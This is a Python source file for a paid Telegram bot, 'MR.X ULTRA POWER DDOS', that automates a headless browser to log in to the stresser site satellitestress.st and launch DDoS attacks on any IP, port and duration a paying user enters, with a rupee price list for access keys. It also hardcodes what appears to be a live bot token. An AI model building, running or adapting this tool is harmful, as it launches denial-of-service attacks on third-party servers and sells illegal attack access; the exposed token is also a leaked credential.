import asyncio
import time
import logging
import os
import re
import json
import string
import random
import pickle
import signal
import sys
from datetime import datetime, timedelta
from telegram import Update, ReplyKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from webdriver_manager.chrome import ChromeDriverManager

# ==================== CONFIGURATION ====================
BOT_TOKEN = "8562518597:AAGpVd-4xGZx3mJgkXQo2AYUKooJE_JWgZk"
OWNER_ID = 6643958471
CHROME_PATH = "/usr/bin/google-chrome"

DATA_JSON = "users_data.json"
COOKIES_FILE = "session_cookies.pkl"

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

user_state = {}
driver = None
logged_in = False
data = {
    "approved_users": {},
    "disapproved_users": []
}

# ==================== DATA MANAGEMENT ====================
def load_data():
    global data
    try:
        if os.path.exists(DATA_JSON):
            with open(DATA_JSON, 'r') as f:
                data = json.load(f)
    except:
        pass

def save_data():
    try:
        with open(DATA_JSON, 'w') as f:
            json.dump(data, f, indent=4)
    except:
        pass

def is_owner(user_id):
    return user_id == OWNER_ID

def is_approved(user_id):
    if is_owner(user_id):
        return True
    if str(user_id) in data.get("approved_users", {}):
        return True
    return False

def save_cookies():
    global driver
    try:
        if driver:
            cookies = driver.get_cookies()
            with open(COOKIES_FILE, 'wb') as f:
                pickle.dump(cookies, f)
    except:
        pass

def load_cookies():
    global driver
    try:
        if driver and os.path.exists(COOKIES_FILE):
            with open(COOKIES_FILE, 'rb') as f:
                cookies = pickle.load(f)
            for cookie in cookies:
                driver.add_cookie(cookie)
            return True
    except:
        pass
    return False

async def initialize_browser():
    global driver
    try:
        if driver:
            return True
        
        chrome_options = Options()
        chrome_options.add_argument("--headless=new")
        chrome_options.add_argument("--no-sandbox")
        chrome_options.add_argument("--disable-dev-shm-usage")
        chrome_options.add_argument("--window-size=1920,1080")
        chrome_options.add_argument("--disable-blink-features=AutomationControlled")
        
        service = Service(ChromeDriverManager().install())
        driver = webdriver.Chrome(service=service, options=chrome_options)
        return True
    except Exception as e:
        print(f"Browser init error: {e}")
        return False

# ==================== KEYBOARD BUILDERS ====================
def get_owner_keyboard():
    keyboard = [
        ["🔐 Login", "🔍 Check Status"],
        ["✅ Approve User", "❌ Disapprove User"],
        ["🚀 Run Attack"],
        ["📊 View Stats", "🔴 Logout"],
        ["🔁 /start"]
    ]
    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)

def get_approved_keyboard():
    keyboard = [
        ["🚀 Run Attack"],
        ["🔁 /start"]
    ]
    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)

def get_user_keyboard():
    keyboard = [
        ["🔁 /start"]
    ]
    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)

# ==================== LOGIN FLOW ====================
async def start_login_flow(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global driver, logged_in
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text("❌ Not authorized.", reply_markup=get_user_keyboard())
        return
    try:
        if not driver:
            await initialize_browser()
        
        driver.get("https://satellitestress.st/login")
        await asyncio.sleep(10)
        
        if load_cookies():
            driver.refresh()
            await asyncio.sleep(5)
            if "dashboard" in driver.current_url or "attack" in driver.current_url:
                logged_in = True
                await update.message.reply_text("✅ Already logged in! 🍪", reply_markup=get_owner_keyboard())
                return
        
        driver.save_screenshot("login_screen.png")
        with open("login_screen.png", 'rb') as photo:
            await update.message.reply_photo(photo=photo, caption="📸 Login Page Loaded.\n\n🔑 Please send the Access Token:")
        os.remove("login_screen.png")
        user_state[user_id] = {'step': 'waiting_token'}
    except Exception as e:
        await update.message.reply_text(f"❌ Login Error: {str(e)}")

async def enter_token(update: Update, context: ContextTypes.DEFAULT_TYPE, token: str):
    user_id = update.effective_user.id
    try:
        wait = WebDriverWait(driver, 15)
        token_field = wait.until(EC.presence_of_element_located((By.ID, "token")))
        token_field.clear()
        token_field.send_keys(token)
        user_state[user_id] = {'step': 'waiting_captcha'}
        driver.save_screenshot("captcha_view.png")
        with open("captcha_view.png", "rb") as photo:
            await update.message.reply_photo(photo=photo, caption="✅ Token Entered.\n\n🔢 Now send the Captcha characters:")
        os.remove("captcha_view.png")
    except Exception as e:
        await update.message.reply_text(f"❌ Token Error: {str(e)}")
        user_state.pop(user_id, None)

async def enter_captcha(update: Update, context: ContextTypes.DEFAULT_TYPE, captcha: str):
    global logged_in
    user_id = update.effective_user.id
    try:
        captcha_field = driver.find_element(By.CSS_SELECTOR, "input[aria-label='Enter captcha answer']")
        captcha_field.send_keys(captcha)
        login_btn = driver.find_element(By.CSS_SELECTOR, "button[type='submit']")
        login_btn.click()
        await asyncio.sleep(6)
        
        if "dashboard" in driver.current_url or "attack" in driver.current_url:
            logged_in = True
            save_cookies()
            await update.message.reply_text("✅ Login Success! 🎉\n\n🚀 You can now use attack!", reply_markup=get_owner_keyboard())
        else:
            driver.save_screenshot("fail.png")
            with open("fail.png", "rb") as f:
                await update.message.reply_photo(f, caption="❌ Login failed.")
            os.remove("fail.png")
    except Exception as e:
        await update.message.reply_text(f"❌ Login Error: {str(e)}")
    finally:
        user_state.pop(user_id, None)

async def check_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text("❌ Not authorized.", reply_markup=get_user_keyboard())
        return
    if not driver:
        await update.message.reply_text("❌ Browser not initialized.", reply_markup=get_owner_keyboard())
        return
    try:
        if "dashboard" in driver.current_url or "attack" in driver.current_url:
            logged_in = True
            await update.message.reply_text("✅ Status: LOGGED IN 🟢", reply_markup=get_owner_keyboard())
        else:
            logged_in = False
            await update.message.reply_text("❌ Status: NOT LOGGED IN 🔴", reply_markup=get_owner_keyboard())
    except:
        await update.message.reply_text("❌ Status: ERROR ⚠️", reply_markup=get_owner_keyboard())

async def logout_session(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global driver, logged_in
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text("❌ Not authorized.", reply_markup=get_user_keyboard())
        return
    if driver:
        driver.quit()
        driver = None
    logged_in = False
    await update.message.reply_text("✅ Browser session closed. 🔴", reply_markup=get_owner_keyboard())

# ==================== ATTACK FUNCTIONS ====================
async def run_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_approved(user_id):
        await update.message.reply_text("❌ Not authorized.\n\nTo buy key: @MRXYTDM", reply_markup=get_user_keyboard())
        return
    
    if not logged_in or not driver:
        await update.message.reply_text("❌ Server not ready\n\nPlease wait or contact @MRXYTDM", reply_markup=get_approved_keyboard())
        return
    
    user_state[user_id] = 'awaiting_attack'
    await update.message.reply_text(
        "🚀 READY TO ATTACK 🚀\n\nType 👉: <ip> <port> <time>",
        parse_mode='Markdown'
    )

async def process_attack(update: Update, context: ContextTypes.DEFAULT_TYPE, text: str):
    global driver
    user_id = update.effective_user.id
    if user_id not in user_state or user_state[user_id] != 'awaiting_attack':
        return
    
    parts = text.strip().split()
    if len(parts) != 3:
        await update.message.reply_text("❌ Invalid format\n\nUse 👉: <ip> <port> <time>", parse_mode='Markdown')
        del user_state[user_id]
        return
    
    ip, port, duration = parts
    try:
        port = int(port)
        duration = int(duration)
        if duration < 30 or duration > 300:
            await update.message.reply_text("❌ Time must be 30-300 seconds.")
            del user_state[user_id]
            return
    except:
        await update.message.reply_text("❌ Invalid numbers")
        del user_state[user_id]
        return
    
    await update.message.reply_text("⚡ Wait 5 Seconds...")
    
    try:
        driver.get("https://satellitestress.st/attack")
        await asyncio.sleep(6)
        
        wait = WebDriverWait(driver, 20)
        
        ip_in = wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, "input[placeholder='104.29.138.132']")))
        ip_in.clear()
        ip_in.send_keys(ip)
        
        port_in = driver.find_element(By.CSS_SELECTOR, "input[placeholder='80']")
        port_in.clear()
        port_in.send_keys(str(port))
        
        time_in = driver.find_element(By.CSS_SELECTOR, "input[placeholder='60']")
        time_in.clear()
        time_in.send_keys(str(duration))
        
        launch_btn = wait.until(EC.presence_of_element_located((By.XPATH, "//button[contains(text(), 'Launch Attack')]")))
        driver.execute_script("arguments[0].click();", launch_btn)
        
        await asyncio.sleep(2)
        
        await update.message.reply_text(
            f"🚀 MR.X ULTRA POWER DDOS 🚀\n\n"
            f"🚀 ATTACK BY: @MRXYTDM\n"
            f"🎯 TARGET: {ip}\n"
            f"🔌 PORT: {port}\n"
            f"⏰ TIME: {duration}s\n"
            f"🌎 GAME: BGMI",
            parse_mode='Markdown',
            reply_markup=get_approved_keyboard()
        )
        
    except Exception as e:
        await update.message.reply_text(f"❌ Attack Error\n\n{str(e)}", reply_markup=get_approved_keyboard())
    
    del user_state[user_id]

# ==================== USER MANAGEMENT ====================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user_name = update.effective_user.first_name or "User"
    if is_owner(user_id):
        msg = "🚀 MR.X ULTRA POWER DDOS 🚀\n\n👑 Welcome Owner!\n\n🎮 Use the buttons below:"
        keyboard = get_owner_keyboard()
    elif is_approved(user_id):
        msg = f"🚀 MR.X ULTRA POWER DDOS 🚀\n\n✅ Welcome {user_name}!\nYou are Approved\n\n🎮 Use the buttons below:"
        keyboard = get_approved_keyboard()
    else:
        msg = "🚀 MR.X ULTRA POWER DDOS 🚀\n\n📌 Welcome to the Bot\nRedeem a key to get access.\n\n💰 PRICE LIST:\n▫️ 1 Day    – ₹200 🔥\n▫️ 1 Week   – ₹700 🔥\n▫️ 1 Month  – ₹1500 🔥\n\n🛒 To Purchase: @MRXYTDM\n\n🎮 Use the buttons below:"
        keyboard = get_user_keyboard()
    await update.message.reply_text(msg, reply_markup=keyboard)

async def my_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user = update.effective_user
    if is_owner(user_id):
        msg = f"👤 User ID: {user_id}\n📛 Name: {user.first_name}\n\n✅ APPROVED (Owner)\n⏰ Expiry: Unlimited"
        keyboard = get_owner_keyboard()
    elif is_approved(user_id):
        expiry = data["approved_users"][str(user_id)].get("expiry", "N/A")
        msg = f"👤 User ID: {user_id}\n📛 Name: {user.first_name}\n\n✅ APPROVED\n⏰ Expires: {expiry}"
        keyboard = get_approved_keyboard()
    else:
        msg = f"👤 User ID: {user_id}\n📛 Name: {user.first_name}\n\n❌ NOT APPROVED\n\nTo buy key: @MRXYTDM"
        keyboard = get_user_keyboard()
    await update.message.reply_text(msg, reply_markup=keyboard)

async def approve_user_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text("❌ Not authorized.", reply_markup=get_user_keyboard())
        return
    user_state[user_id] = {'action': 'approve'}
    await update.message.reply_text("✅ Approve User\n\nPlease send: <user_id> <days>")

async def process_approve(update: Update, context: ContextTypes.DEFAULT_TYPE, text: str):
    user_id = update.effective_user.id
    try:
        parts = text.strip().split()
        if len(parts) != 2:
            await update.message.reply_text("❌ Invalid format. Use: <id> <days>")
            return
        target_id = parts[0]
        days = int(parts[1])
        expiry = (datetime.now() + timedelta(days=days)).strftime("%Y-%m-%d")
        data["approved_users"][target_id] = {"expiry": expiry, "approved_by": user_id}
        if int(target_id) in data.get("disapproved_users", []):
            data["disapproved_users"].remove(int(target_id))
        save_data()
        await update.message.reply_text(f"✅ User Approved!\n\n👤 User ID: {target_id}\n📅 Duration: {days} days\n⏰ Expires: {expiry}", reply_markup=get_owner_keyboard())
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)}")
    finally:
        user_state.pop(user_id, None)

async def disapprove_user_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text("❌ Not authorized.", reply_markup=get_user_keyboard())
        return
    user_state[user_id] = {'action': 'disapprove'}
    await update.message.reply_text("❌ Disapprove User\n\nPlease send the user ID:")

async def process_disapprove(update: Update, context: ContextTypes.DEFAULT_TYPE, text: str):
    user_id = update.effective_user.id
    try:
        target_id = int(text.strip())
        if str(target_id) in data.get("approved_users", {}):
            del data["approved_users"][str(target_id)]
        if target_id not in data.get("disapproved_users", []):
            data["disapproved_users"].append(target_id)
        save_data()
        await update.message.reply_text(f"❌ User Disapproved!\n\n👤 User ID: {target_id}", reply_markup=get_owner_keyboard())
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)}")
    finally:
        user_state.pop(user_id, None)

async def show_stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text("❌ Not authorized.", reply_markup=get_user_keyboard())
        return
    approved_count = len(data.get("approved_users", {}))
    disapproved_count = len(data.get("disapproved_users", []))
    msg = f"📊 System Statistics\n\n✅ Approved Users: {approved_count}\n❌ Disapproved Users: {disapproved_count}"
    await update.message.reply_text(msg, reply_markup=get_owner_keyboard())

# ==================== MESSAGE HANDLER ====================
async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    text = update.message.text
    
    if text == "🔁 /start":
        await start(update, context)
        return
    if text == "🔐 Login":
        await start_login_flow(update, context)
        return
    if text == "🔍 Check Status":
        await check_status(update, context)
        return
    if text == "🔴 Logout":
        await logout_session(update, context)
        return
    if text == "🚀 Run Attack":
        await run_attack(update, context)
        return
    if text == "📊 My Status":
        await my_status(update, context)
        return
    if text == "✅ Approve User":
        await approve_user_start(update, context)
        return
    if text == "❌ Disapprove User":
        await disapprove_user_start(update, context)
        return
    if text == "📊 View Stats":
        await show_stats(update, context)
        return
    
    if user_id in user_state:
        state = user_state[user_id]
        
        if isinstance(state, dict):
            if state.get('step') == 'waiting_token':
                await enter_token(update, context, text)
                return
            elif state.get('step') == 'waiting_captcha':
                await enter_captcha(update, context, text)
                return
            elif state.get('action') == 'approve':
                await process_approve(update, context, text)
                return
            elif state.get('action') == 'disapprove':
                await process_disapprove(update, context, text)
                return
        
        elif state == 'awaiting_attack':
            await process_attack(update, context, text)
            return

# ==================== MAIN ====================
def main():
    load_data()
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    print("🤖 MR.X ULTRA POWER DDOS BOT IS ACTIVE 🔥")
    app.run_polling()

if __name__ == '__main__':
    main()